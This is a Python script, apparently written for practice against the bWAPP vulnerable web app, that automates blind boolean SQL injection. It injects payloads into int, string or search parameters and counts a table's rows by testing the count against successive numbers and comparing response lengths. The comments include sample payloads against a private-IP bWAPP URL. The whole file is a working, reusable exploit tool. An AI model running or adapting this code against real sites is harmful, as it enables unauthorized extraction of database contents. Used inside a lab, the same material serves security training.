# 得出user表中有多少行数据
# id=0 or if((select ascii(substr((select count(*) from user limit 0,1),1,1))>51),1,0)
# http://172.30.61.112/bWAPP/bWAPP/sqli_2.php?action=go&movie=100 or if((select count(*) from movies limit 0,1)=10,1,0)

# -*-coding:utf-8-*-

from global_data import glovar, glofun


def get_rowcount(url=glovar.url3, cookie=False, type='search',
                 tbname='admin'):
    response_length = 0


    # 查数据库test中表的个数 基础知识--这里的方法只使用与表的个数少于10的，要是多多于10的话substr(({sql}),2,1)要这样增加截取，或者substr(({sql}),1,2)
    if type == 'int':
        payload = '+or+if((select+count(*)+from+' + tbname + ')={tbcount},1,0)'
    elif type == 'string':
        payload = '\'+or+if((select+count(*)+from+' + tbname + ')={tbcount},1,0)%23'
    elif type == 'search':
        payload = '%\'+or+if((select+count(*)+from+' + tbname + ')={tbcount},1,0)%23'

    for i in range(0, 100000):

        full_payload = url + payload.format(tbcount=str(i))

        url_read = glofun.url_request(full_payload, cookie)

        if response_length > len(url_read):
            print("table %s row count is %d" % (tbname,i - 1))
            break

        response_length = len(url_read)


if __name__ == "__main__":

    #get_rowcount(url=glovar.url3)

    get_rowcount(url=glovar.url4, cookie=glovar.cookie, type='int', tbname='movies')
